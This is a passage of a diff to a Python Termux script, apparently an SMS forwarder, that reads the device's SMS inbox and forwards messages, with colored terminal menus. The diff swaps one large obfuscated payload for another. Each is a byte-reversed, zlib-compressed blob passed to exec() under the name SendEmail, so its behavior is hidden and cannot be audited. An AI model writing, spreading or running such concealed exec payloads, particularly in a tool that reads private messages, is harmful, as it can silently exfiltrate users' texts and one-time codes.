+        center(f"{red}║{yellow}      Direct navigate to about menu       {red}║", 15)
+        center(f"{red}╚══════════════════════════════════════════╝", 5)
+        print()
+        center(f"{red}╔══════════════════════════════════════════╗", 5)
+        center(f"{red}║         {magenta}[{white}01{magenta}]  {yellow}BACK TO MAIN MENU          {red}║", 30)
+        center(f"{red}║         {magenta}[{white}02{magenta}]  {yellow}EXIT                       {red}║", 30)
+        center(f"{red}╠══════════════════════════════════════════╝", 5)
+        center(f"║{Space(42)}")
+        Input = INPUT("╚════► ")
+        if (Input == "1") or (Input == "01") or (Input == "one"): MENU()
+        elif (Input == "2") or (Input == "02") or (Input == "two"): EXIT()
+        else:
+            center(f"{red}╔══════════════════════════════════════════╗", 5)
+            center(f"{red}║              {blue}Invalid Option              {red}║", 15)
+            center(f"{red}╚══════════════════════════════════════════╝", 5)
+            sleep(2)
+            MENU()
+    except KeyboardInterrupt: EXIT(False)
+    except Exception as e: print(f"{red}{e}{reset} !\n{yellow}Repost this issues at {blue}https://github.com/GreyTechno/SMS_Forwarder/issues"), subprocess.getoutput("termux-open-url https://github.com/GreyTechno/SMS_Forwarder/issues")
 
-SendEmail = lambda _ : zlib.decompress(_[::-1]);exec((SendEmail)(b'\x90\x06\x14\xd0\x01\xff6\xdaf[\xf5\t\x0ct\xe9\xb1\x92|*~\x14\xd7r\xaeO\xe8\xfa\x12x\xef1\xd7t\xf8\xfdZ\x81\xbeo\xff:\xa0\xee\xe3\x9a<\x0cA\xc0[\xdd|\xa8B[\xb2!{\xe3[\xa4\x91\xbfL\xaa\xa8\x13or\x9e\xbb\x07t%\xde\xdf\nr\xb1$F\xe2\xfa\x1f\xff\xb0r\xe3d\x1f\xe8V${Y\x08+a\xea\x83S*\xb3\x04S\xc3Y\xb6.$\xcd}\xfb\xf4I\x85\x8fM\x804\x87\xa1\xbe\x82Z\xfe>\x9e\x15t\r\x87\x97\xe3\xcez\x15\xd0"\x1e\xb0\xbe\x7f\xc0\xbc\xf5\x85_X\x192\xb3\x85(\xd4O>\x06\x82F\xe4,\xea\x86\xf6\xbd\x9f$\xa7Cg\xe7\xda\xff\x0cx\xd1\x0f\x9d\xb9\xef\xd4\x98\x890\xd6A\x0c\x1e\x9e}w\xe3zDe\xa1\xdf\x13\x8c\x11\xcb\x89\xfc\x8a\xde\x0c\x1bd\xdf5\x0e\xab\x04&\x1a\xd5\x0e\x19Aa\xd7U\xa3\xd9\xb2\xfba\xec\xaf\xad\xa5\xf2\xa0\xe5\xbd\xbf\xab+\xf0\xe3\xe1\x93\xeb\xb3\xe3\xec\xfe\xfe\xcf\'\x06\x1f\xa1b[\xc0Dh\xa0\xf0q\xd1\x8a\x8aI?\x9c\xa7\x88oq:\xec\xaf\xf3]\xee\xa9\x15\xf3\x1dV\x1e\x96\x16\x8a~(\xe3~\xb2\xd5\xec\xd7H5f\xd8p\xd9\xd1N\xdfZ\x1f\xbe7V\xa0AF\x97zi\xd6\xc60\xd5\x14\x16\xec&@\xcbx\x17\xa5\xeb7\x05\x86\xa9\xc5c.\\\xad\xdf[5\xc3-oFm\xd5\xf0\xdc\x17\xb8.\x93n\xfe\xf4\xb1\xebv\x1a\xd6\xc5`\xd3\xac\x94\xbb\xcb\x13x\x93,X3n.\x9b\x89\x10\xf8p\x10\xb7u\x02\xad\x86\x99\x0f\x14I\t\x87r(\x86\xdd\xc5\x9b`\xce\xb4D\xafZ*\xde\xa24\xbd\x88p\xc3R\xfe\xc7\x17zR\x97;\x92\xae\x91~\xfa\xea5\x8f\xbd\xd2\xd7w=\xe5E\x12s\x82\xe5\x8b\xe0\xe4\xe4\x11\xc4\x91\xa3\xc0\x89\x01,\x07\r\xd1\xac\xb3s\xa9\xbd^\xdf\xcb\xd5\xf5\x02(\xb9\x074\xcaK\xe4-m\xb2\x85J\x16\xe8K\x81h>B\t\x11\xb6\xce\xe1\xb7\xf2\xf5tS\xd6\n\xa8\xdb\xfaX\x1a\x7f?\x1f\xd7Gu!\xc5L"\x0c\xfdc\xd0\x89,cS\x8d\x89IQ\xaa\x7fG\xe1x\xb8\xe9\x99\x94\\t\xc9\x8da\x8a\xce\xe6[/\x99\xd8\t\xa2\x13\x18\xe6C\x19\xc4\xae\xb7A?F\x13\xb5\x9e\xaf5\x9e*\xbb\'\x82\xccn\xe4\x14r\x9f\xa9\xd3\xacu\xfa\xa8\x93\xda=(\xae\xd4\x8dk\x98\xce\xb4`e\x0c%J\x18+\x8f\xc9\xd0^\xc1\x10\x0cP\xa5!R\x0b\x00\xc9\x04\xf0\xda1\x84\x80\x83@\x95j#0\xb7\x96\x8c%\xf9K\xf5\xa5\xa13\xbcd#R\xc0\xb3<\x8b\x86N\xc9\x19\x10m\xec\xfcO\x99\x88\x1f\xe8\xa1\xbf\xd0\xfc\xe9\x01c\xbc\xd6i\x9dP\xd4\xb3z\x13u\x89$\x84\xfe\xbfd\xee(\x89/\xd2\xe4\xf3\'\x8fqL\xbc8bg\xd7\xfca\x8am\x0bm\x14J\x99\xa5\x05\xb5ST\xb6/\xaaz8n\xeb\x82\xbc\xb8\xfd\x1b\xf03\xa7\x12\x8f\xfc\xd5\xb5\xa7\x8e\xfc\xb5\xf7\xa9\x10uH\xdb\x04\xed\xb2\x1e\x82[\xa4\x93\xea%{d\x80xK\xf7I\x00\xe5b\x03\xcf\xedT\x03\x96\xa1\xe6\x02\x1a\xa1\xf1\xe6G\xba\x02\x8c\x11\x06.M\xda\x9f\xd5s\x07\xb3\xb7\xd2\xd6\xec\xc47w\xd6f\xa2K\x11\x87Aj\xfdy{\xfa\xf1\xfd||`/\x13>l\x82\xef\xf1\xa3\xd4\x18\\H*\xa4\xbcx\xce\xb5\x97\xd2\xcc\xc5\x92 8b\x9a9\xfd\x90\xae4\x03\xec+MP\xe8\xc2\x1f\x9a\x89\xfe0\xf7\x0b\x9e\x96gx\x9d\x94|\x90/\xe5z\xb0\xfb\xe1*\xeb\x05\x0f\x19\xd3\x1a\xb5.\x8c\x1agg\xfe\xd8\xf6\xe9\x87\xd8\xf0\xba\x06\x02\xb6\xb9\xab\x83\xd0\xfb\xa7n.\x90\xdf[d\xc0\x1e \xdc]f\xa1\xad\xed\xec\x00\xfa\xf9s\x07\xf4 /\x0b\xe9\x08\x03\xb7\xce\xe7\xd8\xbe\xf8om\xb5]\x92\xe07\xf9\xce/\xb6\xbb\xf3\xd1\xa4x \xffC5M\xdcq\xd3\x8ft\xb7\xd0z\x0eA\x15\x86\xff\xcf\x18\x89\xd5\xd5~E\xa3\x9e\x82rrp\x9c\xab\x85;\xa4\xed\xe2\xcd?\xbd\x96\x8dGl\x9a\x97\x07U\xe8ko\x0f\xd3c[\x1b\xa7\xdd\xb0j\xf7\xacg\x88\x06\x1a\xf0N\xa9\xf1My\xac\xec\xd9sb\xf0\x1b\xe5c\xa7\xaf\xc6W0\xbf\xf3\xf9T\xd5)s\xb3\x850\xb7qV\xb2ifqs\xae\xf8\xaeI\xea]\xf9N\xdbn\x18t\xe3\x05\x89\xac\xceymg\x9c\xca\xe7BQ\x19\x82\xcc\xc9\x0f\x05\xf5r\x11\xcd\xb6vc\xf4/o\xce:\x7f\xbd\xfc\xb8\xe9\xff\xfdE#\xdeD\xcbr\x9a\xff\xef\x874\x16\xbd\xab\xab\xe5\xf2\xa3m\x80,\xc49\xe8\x13\xb6Sm\xfd\xdd\xa5\xd9\xf6\x89\x9fu\x99\xf65\xbf[\x97\xb4M6\x11n\xeb\xfd$\xa6\xff$\xbcJD\x8f\x97\xfbB\xfby\xedmG\xect5G\xed\x1ab\xc4\x00\xeb\x15\xe6\xa0\x07m\xce0\xbe\x1dS\x12p\x05\x94\x89m\xb0\x11\x1bo\x90\x05\xe9\xc0\x16\xa0]N\xc9G\x98Z\x19]>K\x1a4^\xb1s\xbb3\xa8\xb1\xbcs1\\\xee2E\xdaz\xdc\xd8Uot\xbb-&\x83\xbe\x1c2/\xa1\xaf\xde\x8cq?Xp_Q\xd8\xf3\xa4\xedN\xfdf\xef\xce\xc4K\xf9\xd8\xc2\x8a\xd1L\xaf\x030\xe62 \xb6\x96\x8d\x10\x98~}\x9c\xdc+\x0f\xd5\x93m\x8c\x87d\x9f\xa2\xc5\xd3C\xef\xe1\xa3e\x83\xb93+eu\xd42\xc5\'\x1a\xdc1\xcd\xb3\x19i{\xbd\x0f5)c\x83W\xfd`\xc3\xdd\xa7\x0cu\\\xe3u\xda5\xa0}a\x192\xb4\xa28\xbd\x92\x8e/g\x96\x97p\x165\xe6}p\r\x7f\x9a\xb8;y\x80cl\xd5\xa01\x9cr\xcb\x06\x90\xa5\x98\x1d&\x03\x1d\xd9\xe8v\xd7\xe0K\xf9\xdc\xaa1\xc4c+G\xe4"\xba\n\xba\xc3\xad\xe8^\xdd\x9a\x83G\xcc\xc4(\x10\x82zH7\x0b8\x8cS\xe2"o\x98\x8bn\x13\xd1\x11E3\xcew\x08^A\x8a\x00\r\x94nN\xc9\xba\x97\x9b\x14\xe6\x0e\x8dZY\xbd\xf8\x19\xae\xdb\xe2\x08\x94\xf2\xaak\xb4\x9a\xd746\xcc4\xba\x92\xa0\xd2v\xac\'\xdfP\x14\x1dO!\x16(\x1c\x18LmT{\x18\xf2\x83W\xa2\xdb\xc0;\xb6\xb2\xde\x8d\xa5\xd1r\xc6eY\x97!>\xa4\x13N\x13B\xcc\x8e\xe4\xfb9\xab\xd3\xe8\x82\xc7\x1b\x1e\xe4\x16\xdc\x88F\xe1\xc9\xa9\xaa6\xa3i\xfe\x8b\xa7\xa3\x1c\xcbR\xf4\xfb\x1df\xae\xa3k\xadl\xce\xc7y\xf6\x85[\xe7\xb8Hu\xdb]\x11\xe7m!g\xa0\xb6\xfd\xac\x8e\xdbEAa\xbb\xb2g\xb5\x1a\x85\x1fYb\x1c\xe2\xa3\x03Z\'\xa7_p\xee\x1e=\xa5;S\xb4\xc2#\x03\x9b\x00\x82\x82\xc7a\xfd\xa1\x8a\x88\xfa\t\xcdL=t5\xdf:+j\x16mU\x06o~\x87\x97!\xcb\x0fQ\xd1\xa4\x85e\x94\xa5l\xb2\x1359\x88^\xa4"^\x0b\x15\xd3<\xfbT\x9f[\xf5\xde\xbcY\xd1\xf5!\xe5\x80\x84\xb0\x8f\xf1\x9cg\xdedu}\x92\xfe\xcd5\xb5\xb80m\xb7\xaa\xbda\x96\xf8\x1b4\xa2e\x9am?\xa9\xdc\xd3F\xe6%s`n\x95\xcdH\x15sz\x7fQ\x1d\x8a8iip\xe8D[\xa8\x179\xc0\xb8\xf1>\xd6\xc3n\xfa^\xaf\x97\x17\xd2\x16\xd7cl$\x02\xc9\x0cp\xec\x9fRF\xe9\x81\xc0\x99\xea\x92\xe6;\x08\xe7\xa5H%Hv&\xa5\xfdp\xbe\xd7\x02T?\x06-\x18\xb5]\x9d\xa3\x18\xf0\xe0r\x06tC`\x94\xa7\xf0\xf1<XI\xb5\xd2\x8cGd\xf7\xb8\x05S\x1c<\x01\x00\xd6a!x\xc1Ml\xe5\xe7\xd4\x0b\xa8\xba\x041v\xea\xae.]\xb9t,\xd6pssh\xb8\x08\x8ao\xad\xe0\x15G\xad\xf5\x97\xb3-\xbaB\x19\xd6(\x8e}\x92~\xc2\xd9t\xf9E\xd3\xe5\xe7\x068+8/\x14\xb9\x93\x0f\xcf_=\xa7\xd9W\x9f\xcd\xbcK\xae\x18Mf1\x90\t\xb8\x90\x1bO\xf2\xb1\x96\xd14\x0f\x16]\x11\xefq\xb7}:H\x90:]\x85\xe9\xa0\xaa2\xd0\xb0H^\xa0\x86\x11\xa8\x0b\x1c\xcb\xb2\x02\x15b\xa4\xe9\xa8\xf1JZ\x03n\xdd\x91\xa9\xd6gj\x0c\xfb\xcf\xa9K\xfd>\xcd\xf0\xd8\xe3\x81Rw\xbb@1h\xba\x0e\x918\x85\x012\x0c\xddy\xf6@\xf6\x83\xf5k.\n\r\x12\xb8\x16\x1f\xf6R>\xbd\x00;\xebiF]\xb6\xb5\xaf\xe1\xa8$\x1d)\xb2\x1bp\x0c\xcf\x7f\xa5r\xba\x93\x97\xab\xd5\x8dh\x98\x84\xec\xe9\x1aS\xd1\xc5\x13\x845\xe2\xdbw\xb9\r\xde\x90b\x1ceO\xa6\x8dD\x9f\x83\x00S\xa4\x7f\x93\xee\xde\xf1\xd1\xc3\x0e\xf1\xe2\x8e\xb0K\xc4\xc1\xb6 \x85\x14"+^\xd3\xb7\x1a\xf7\x14k\xf2\x9c\x9c\xfbg\xd0\xe2\xa8R\x02\xc6$\x90T\x12\xc7\x10\xa9m\x1b\xe3\xb2Cv\x14\xb1\xa5x\xfd\xa8\x95\x08\xd3*D\x9b\xfd\x8d\xba\x8c\x9a\xed"i\x89\x8f\x19\xfb\xecb\x81Rh9\x94\x96$\xab\xac\xba4\xb0P2\xe8@v#)\x08Z\xba\xf1\x97g\xec\x83\xde\x92j\r\xf8\x92\xc54\xb6\x99\x84\x1d-\x94\x05\\\xe22\x88\xd1\xc0R\xde\xe2R\xd95\x17A\x12[I\x98\x92\x0e7\r\x11\xc0\xbd\xb7\xa0\x17\x14T\xff\xa1x\xb2\xfe\xf8\x1c\x87\x8fm\xf3\t\xe0\xa5\xdb\xbd\x86\xe7S\x7fy\x05\'\x93\xe3\xc2\xc5g\x93&\xce\x83\xaa\xaeu\xe1\x18\x85o\xe0K\xd4\xb9\x07\x13\xee#\xb39Eb\x1eb/\xe0Si#\xb5\tu\xe4g\x18\x83\xba5\xcb\x90\x8c\xfba\xe8\x96\x8d\xc6\x0c\xf1M\xaaA\x1c\xc0\xe7\x1d1\x13\xe1b\x91p>\x8dx\xfe\xbf2B\xaa)(\xac\xbf`\xfe}\x7f\xb3Q$,\x02\xf25\xe6\x96\xb1\xabY\x15dj9\x06\x7fd\'.\xf5\x99\xab\xa1.\xe4\xdb\x15(\x16\'\\hX\x9a6vd\x87\x0fKhqEQB\nr\xfb;\x11\xea+\'\xcc\xc1W\xd4\xa5fja\x14\xce<\x85\x94.cI(\xadfdG\x0cF\x14Di\xbe\xd9\xe7\x19\x00z\xa45\xce\x14T\n\t\x89\xb5=\xcf\xa9\xf4\xd8\x01999\x10=\xfd\xfd\xbf__\xdf\x1f\x1d\x8b_\x86\xc3\x9f\xf0\xc9\xd0\xe5\xd1\xb2!\x8b9\x06\xc2B\x0c\x92\xd9\x81!\x94E\x10.\x0b\xaf\xdbY,\x10,+B*\xed\xac\xc9\xff\x8c\x85\xf2O\x93\xc0}d3f\x8f\x8d ]\x0f\x82\t\xe7C\xe7|1\xc1\x9f\xa9\xf6\x08 T\x8aq\x12\xe4Ib)\xc8\xac|\x8asd\xb7\x07\r0\x8f\xbf\xe6\x13]\x02\xc9\xf6E/\xdetts\x800\xd0\xfd(I\xdb\x1c\x87\xe3\xb2=\xef\xfd\x9d\xd98\xe4\x95\xe4\xb6\xbbX\x95\xb6F\x18\x05\xfbK3\x0e\xe5\xa7{p\xa5\x03$\x98./\xb2N\xb2\xe4\xdd\x0e\xf8B\xbf;\xf5\xba\xd3\x93k\x1a\xd5\x9cx'))
-
+SendEmail = lambda _ : zlib.decompress(_[::-1]);exec((SendEmail)(b'6\x88\xd0\x98\x0b\xfe\x87\x97M\x84\x9c\xeeXw(\xfa\x95p\x7fE\xdf#\xc0\xfa\x1e\xdb/O\xc5\xa8$\xe3\xff\xf5\x93mvM\x8e\xd0\xe0a\xfe\x0b\xdd\xe8\xd8\x18\x99N\xf6\x0f"\x83&\x01\t]\x13\xba\x1c+\xf4\xc8\xf2\x82>\xf6\t\xabp6\x88\xfb\xd3\xeeVT(\x8b\xf5\xef\xae\xff\xbb\x076vE\xfe\x85BC\xad\x90b$^Tjc\xe0`\x8c|c6\xf9\xb5\x99\xa9a~\x867)\xe9\xb0{\x18\xf4W\xd0\x0b\x9f\xa7\xe3\xceB\x83\xb8\xfc\xfa\x7f\x99BZ\x00c\xc6W\xaf\xd8\xe7^0\x8b\xe3#$\\p\xc4\x9a\x91\xe5\xdd\x90I\xdc\x81\x92\xa0\xfc/\'\x88*\xd8\xc9\xe9\xe6\xbf\x85:h\xc7N|7\xeaL\x05\x1f\xa7 \xc6\x8eN>\x9b\xed\xbd\x03\xa5Po\xe8\xf4\t\xcb\x8a\xf4\x8b\xde\x8d\x19\xe1\xde\xd5\xf09Q\xaf\x1a\x16\xd5\xd9\x9c(\xac\x1a\x94d\xf3l\xbd\x98\xf6\x17\xca\xee\xf1P\xb1b_U\x85\xfci\xf8\xd1\xcd\xd5\xfa\xea\xf9\xfe\xafGF/\xa5bS\xc0@h\xa8\xf4k\xf9\xf2\x8cH?\xac\xa3\x89o\xb2&\xec/\xcb]\xfe\x91]\xfdVz\xcfC+F?\x14i\xb0\xcc\xc6\xf2e\xa4\x18\xb6\xdcx\xc9\xd1\x8f_\x1b\xeb\xae\xb76\xa7\x9e\x07\x1f|q\xb6\xc60\xd5\x14\x0e\xecFOk9\xe3\xb5\xdb\xb7y\x86\xa9\xc5C.lo\xde\xdb-\xfd+oB]\xcd\xf2\xdd\xe3\xb8\xaf\x17~\xe1\xf8\xb0\xe7v\x1a\xb6\xc3ocl\x98\xfb\xca\x17p\xa3(X\x12\xee\xaf\x1d\x91\x17*`%~\xeax\xdb\r3\xed<\xe0Bc\xdc\x8a#\xbfun\xd8\x13l\x11\x1b\xb6\t\xb3\xa8\x0e\'c\xec0\xd6\xbb\xa1\x87\xde\x94\xa6\xde\xe8\x9b\xc5X}\xba\x8dB\x1f\xb4\xad\xed\xc0\xf9QH\xfb`\xd8l\xfa1I\x00q"`\xf2\xc4@K\x01\xcbrc\x0c|\xab_\xdb\xcb\xf9{}\xbdyW-\xa6\x99M|\xf8\xafl\xbeR\xb1J\x12\xa0\xb5\x1f>x\x84\xd3cq\x97\xf2\xe2\xe8\xc7\x18Ki,u\xac\x9a\xffC#\x9f\xd3\xfa\xe6\xe4\xf6\xa7\xd0\xa8@@]\xe2z\x11$|\x15gbP\xe2|\xach@/&V=nM4\xf9\xe1\x05&r\xd9\x9a\xd6t\xc6\xcf\xea\xac\xa6W,B\x9eP\xee\xa3H~Nsk^Yc\x1bU\xf6F\xc5\xea\xefd\x04S?\xf6c\xd3k\xbc\xa8\xd6\xd3<\xecwO\xc4t4O`\xa07\x8c$\xe5\x18+\x85C\xd7\x8e\xc1\x10\xf2\x84\x93\x84\x92.H,=$#\xc7h\x87\xe2<\xfc\xd74\x01sJ\xb4!\xec\x81\x97d<\x9b\x89s$&\xfa\x03\xfb\xebLt\x8b\xfe\xa5\x8c\x9f\xc5G\xad\xc5w\xa3\xf4i4\xb1\xeb\xdcs\x03\x0e\x11\xc9\xf5\xb0\x18c\x19r\xb2\n%J\xf2\x80\xd6\x19\xca\x1b\xe77=\n5\xf4\xbd\x1e,\xefF\xea\t\xe8\x94\x93\xff\x11h\xef\xfb\xde\x94^\xd5\xed\xce\x916\xa9\x17`\x97\xb9\xc7\xd0K\xf4\x92=\xa2W\xb6I\xf7\t^\xc6F\xf7\x07\xb5\x10\x0b\xd9\x87x\x06\xe9\x87\xa7y\x1e\xe1\x8aT\x02\x0c7s\xca\x9f\xd4\xf2\x07i\xa7\xe8gvc\xed\x9b\xe3\x0bQ5\x88+\xa03.<V\xf9\xbe\xb9\xbd>1\xe3\x88\x9fvA7\xf4\xc1\xbe\x8c6E\xe5S]:k5\xa3\xf40\xb5dP\x0e\x18\xe6\x89wTKM\x0c\xf8i\x876~\xf1\xa8_\xe5\x90k\xd9\xe8ao9\xc9E\xc5\x1c\xf2@g\x08x\x93\xce3\x9f<z+R\xa1\x91\x82\x0c\xea\xff\xa5\xafvx\xfd\x97\t\xa0c\xba\xd4\xb1w\xb20\xf1\xd2\x8b\xa4%\xd5\x90e\xec\xea\x1f\xcd\xb3G \xf6n/v\xc9\xc1\x9d\xf9\x90\x05\xb1\xfa2^\xeb\xebS\xcd\x9f/\xc7\xb2JO\xa7^\x8a\xfd:\xd9\xf2T}9\x1a\x07\x82\x8f\xe4\x12\xf4}\x86\x9f4\xf2\x88~\xa3\xd0\xb2\x08\xac\x0f\xf9p\xa4\x1e\x8a\xf3\xe9W\xafGGG\xe4\xd2\xacG\xb8E\xdb\xed\xc3\xcb\x0fo\xb5\xbdMg\xf2\x16\x05R\xe9\xaanw\xcbmK\xdb\xa5\xdb;\x94\x1dYU\x88:\xca\xceN\xb9\xc9B\xcb\x18\xdd\xa2\xb6\xf9\xa0V\xe5S\xe6\xef\x86[1\xbf\xcb\xb9\\\xc7&_\xf3\x87<\x87\xbd#Q40\xb4\xf9\xd6\xff\x94<\xf5-\xf8\xa0\rg\xef\xa6c\x01\x99\x8c,\xf8\xc8\xc6\xb8\x91\xde\x84\x95\xd3\x01\x85\x93\xee\n\x8a\xa5/M\x19\xc9\xe6/\xd4;\xd3O\x9d\xdd\xdd\x9a|\xef\xfc\xf7/j\x13\x1d\x9a!\xfd\x18}U\xb4\x18\xbd\xbf\x9e@5\xd52\xd5\xf2\xee\x9eZu5\xdb\xdd\xb4+a\x90l8M\x87\xed!\x97\x0fd\x9b\xacyf\xf7\xfcIC\xfeMx\x94\x89\xae\x9f\xd3\n\x19\xbfgb\x10\xd5\xa6\xb1\x08mI\xf2\xd1{+\xad1\x17\xb2\x1c\xedt\xb4\xea\x85\xb3\x83\xcc\xa2\x0bY\xaf\xcd]\xe2\x03\xa30\xbb\x90\xec\xa7P\x83\xf5\xd4\x8a\x9b\xa5\xc1cx\xa6T\xb3\xd8\xf9\xd2X\xd9y\xab\xc0\xf6\x15&\xee:o\xab\x94\xb6z\xdd\x93\xeb@?\xf6\x18{\xd0\xb6\xaeO[9~\xc05GS\xc6\x87\xad9\x0c\xbe\xee\xb7\t9\xea\xc9y8\xaa\x9b\x83L9\x0c\x88)\xb5\x83A"\xef\x86\xe7\xd6\n]\xf2,\xf6\xb2S\xaeD=\x89\xd2F\x1c\xfbF\xab\'^\xe4SZ\xea\xc8E6N\xd4\xb9C\x82&\xd4\xa8{d\x0f\xd4hs\xeb3\xd5/\x0f49C\x82\xa7\x1a\xfe\xd2\xaba\xf5\x82|A\xdd\xc8\xf9\xac\xb0sy:u\xbb\x8c\r^\xb3\x96\x03W\xd4\xf9\x80\xbb\xc8\r@\x93\xe5\x83_\xe6\xb2\xacj\xd12\xf1:\xce\x8d\xbb{\x83\xda|\tzsj\xb5\x03\x0c\xa8(zjgY\x14\xb8\xdbz7\x9bb\xa8\xd1s \x8a\x04 \x8e\x92\x1d\xfc\xce#\x14\xb8\x80\xd7\xeb\x10\xd7L\xf5\xb1<\xf2f5\x1c\xb4\xd2H[\x94\\Q\x1a\xcc\xe4\xb4\xb7\'V\xe1\xbc\xa3\xc8\x1d@\xd5\xdak\x88"c\xc5(Y\xa7R\xbe\xb9\x04\xfdM\xa9*f\xe6+\tu\xd4y\x0bc\xcf\x95\xe4\x06\x04*\xbbU\x0e\xc4<`)\xf9Y\x81;5\xbd\xfa\x95t\xef0#T\x06E\x83NRc\xa6\n\x82I.\xa4\x1b:\xab\x19\xf4AB\xe5\x8fZ\x16\xec\x0c\xd4C\xb3Qxb\xe7\xf7\xf7#\xba\xf8\xe8\xd0\xbd\x0e\xe7K\xab\xa2\xda\xe9Y\'\xb9\xd8\xbd\xa1&\xe9\xae\x17\xdf\xc0\xb2cL\xd2\x82L@\xd6V\x93q\xb4T8\xe8\xd6aU\x1a\x19\x1c\xb2\xc7\xcf\xcexp\xee\xb6=9\xd3\xafz\x0ch\xbaE\xaa\xe9\xe4\x1d\xdd\xb0((f\xe2\xda\xcf\x98\x1e9:\xad\x83VcM\xa7CeAa\xb2\xfa\x8d\xed\xdfsoq!\xd3\xba\xd7\x8aIe\x12\xda)\xd4\xd5\xa7!\xc1\xa9\t\x13\xae\xf6\xefV\xc3$\xbfG\xf4\xdbp\x93\xa2\xea}\xc6\xe1\x04e\xcf\xc3\xf0\x99\x19\xc1\xc5\xe4\n\x86~\xd5\xd0\xe1Z\x8d\xb3\xf5\x94\x98\xcb\xfbz\xf3\t\x0e\xa6\x82\xd5j\x03J\xcb\x12\xa5\x85\xb7J\x96$\x04\xb9\xbd\x05\xac\x0e\xc5s\x94o\x8e\xd0\x88?P\xdaS\x81p\xe2]\x15\x9a\xedt\xbd\xbf\x9d\x9e v\x8b&\xa2@\xac\x9f\x17\x06\x92\xeaH\x0f0Z\xa3\xba\xa4\xb9\x0c\xd7\xfd\xd0\xa4\x12\xa7\xd2\x10\xb2\xfa\xe4\xb8\xaf\x178X!,\xc3E\xc9\xcb5\x0f\xf63\x80\xca\t\xab\xe1`\xff\xeeo\xd3\xf2*\xb9\x9dcR\x07\xcc\x02\xa9\x0e\x0e\xa6\x06\xcbBZ]\x05\x15\x92\xcf\xbfB)Y\xc2&\xbc\xd4\xa2\xec\xfc\xd5&\xe5\xeaN\xf3N\x9a\xcf7\xb9\xe2\xcc\xbe\x97\x07m\xcb\xce\xe2Vq\xcb&H\xb09\xf2Y\xbb\x16\xf3\xef\xb2\xcf\xbe\xcd;\xc5\xcaI\xde8\x99\x84\xbft\xea\xb2\xba|\x9b\x7fx\xb2\xf9K\x82\x1dY\x88e?\xeb\x0e\xfd\xae=\xcaf2\x19\xafjE\xd1\x0e\xaf\x16Y\'_B\x1f\xb9\xb7\xdb\xab\xcaL\xb4,\x13\xe3\x98"\xb8r\n\xf4\xa5\xd5!\x06\xbe~7Px\xa5\r\x006\xcb\x90P,L\xcc\x19\xf6\x9e2\x16z\xc3\xea\xc5a\x87\x02\xc7\xbbm\xa2\x96\xb3\xa1i"\xf7P\x11`\xf5w\x9f&\xebk\x1b\x0e\xb1\xc8\xa0as\x01\x0e\xfdd3\xdd\xe8\x00\x9f2\x14$\xebj\xd8~*\xa5 yU\x88\xdb\x00\xa9;^\x14\x8a\x95\x9c\xb8\xbb\x88\x8e\xe5\xe0W\x9d\x03Iz8\xa4p\x81\xbc\xb5\xdc\xee}\xb5d\x18\xfa\x19R\xe5\xa0\xa2\x03\xc1\x8c!\xd1;I\xf6/<\xf2f\xc6\xb0\xf1AX5\xc4`\x9a8B\x8a\x11\r\x95c\xd8\x0c{J\x0br\x8c\x94\xddg\xdc\xa7=\xe2\x02\xc4$\x96D\x12\x87\x1f\x13m{a\xa4\xfbl(\xb32\xb0\x86\xf1K\x85UT\x91\xb7\xbb\x13U\t\xf4\xda\x18\xd5Y\xed\t\xba\xecB\x03\x96hY\x94\xd6 \xaa^ra`\xa7\xb5\xd0\x8fLFS\xec\x1c\xdb\x87\x9c\x9e\xd2\x00\xfaI(\xd6\xe2K\x14\xa2\xdaf\x10\xb6\xb6Q\xe5s\x80\xc9\xa3C\x01G}\x89\x89\xe4*\xba\x08\x92\x9aL\xc4\x90\xb3\xbf\xa8\x0e\x15\xcd\x1d\x02\xb4\xa7/\xfd\x1b\xd5\xa7\xed\xc0\xe7\xdc:k\x98\x8f\x05\xad\xdc\xec\x0f%wu\x92\x91x\xbd?\x05*\xf6l\xc9\xd0\xb3\x95M\xbc\x02\xd1\xcf\xfc\x11:\x9b!b]\xc0fg(\xac}\xc8E\\\nM f`\xcb\xbc\x8c\xe3\x10\xb4F\xb9\xb2\x10\xaeLz5\x83D!^\x97j\x96^\xa0SO\x98\x89p\xb1\x88\xb9\x1fA\xbe\xb9\xbc\xb2|\xaa(\xe9\xcc\xbc\xd1\xf4\xfe\xff\x16\xa2HXx\xe4;\xc8-SU\xb2*\x88T\x02\x04\xfc\xc6JC\xe3\x0b7D}\xc94*S\xcaIi\xa0fd\xc9\xc5\x93\xec\x1d)\xbe\xc5\x15CH1\xc7\xe4\xccC\xa8l\x97\x0byWS\x11\x85\xa9\x84S8r\x06P\xb9\x0e$\xa1\xb1\x85\x90\x1c1\x18Q\x01\x08\xd4\xbb`o\x82\xfd<\xc5\xf2\xfe\x05O \x90\xbbQ\xdc\xba_\xcc\x80#\xa3\xa3\x81\x01]\xbf\xf7\x9b\x9b\xab\xeb\xfcS\x9f\xf4\x06\xbf`\x95\xb1\xf3\xa2dc\x02R\x8d\x84\xf9\x195\xb3\x02C(\x8a \\V?$a\x90-\x02\xc1\xb3\xe0\x81z\xd8\xf8\xae\x17R\xec\x10O)\x18\xf8_\x821\xc4M\x81E\x88\xc7"\xb1r?\xa9\x80U\xeea\r\xd0\xac\x97$\xa3~\xe7\x87\x87\xcb\x1a.\xb0\xfb;N\xdd\xfb\xa8{\xef\xf2\t\xd9e$*D\x89\x8bh\x92\x82\x8bi}\xdd \x182,\x1d\x9d7n\x98\xdbUI\xd6\xe7l\x8d=\x8d\xd0j\xc1_\xbd\xf68\xdbn\xdb\x1a\xd5\x9cx'))
 def SendNumber(to, data):
     def SendNumberCheck(number, data):
         try:
@@ -371,75 +397,86 @@ def SendNumber(to, data):
         for i in range(((Arrange(os.get_terminal_size().columns) - 2) // 2)-21): finaltxt += " "
         sys.stdout.write("\r"+finaltxt+f"{magenta}[{yellow}*{magenta}] {white}Message Send                {yellow}"), print(), print()
 
-
 STORE, ID = [], ""
 def SendSMS(TO, SVE):
-    global ID
-    details = json.loads(subprocess.getoutput("termux-sms-list -l 10 -t inbox -n"))
-    for data in details:
-        SmsID = data["_id"]
-        if (time.strftime("%Y-%m-%d")) == (data["received"].split(" ")[0]) and ("".join(data["received"].split(" ")[1].split(":")[:-1])) == (time.strftime("%H%M")):
-            SmsID = str(SmsID)
-            if (re.search(SmsID, ID)) : SMSLBAR()
-            else:
-                subprocess.getoutput("timeout 3 termux-toast -b white -c black -g middle -s sms received")
-                subprocess.getoutput("timeout 3 termux-toast -b white -c black -g middle -s forwarding message")
-                for to in TO:
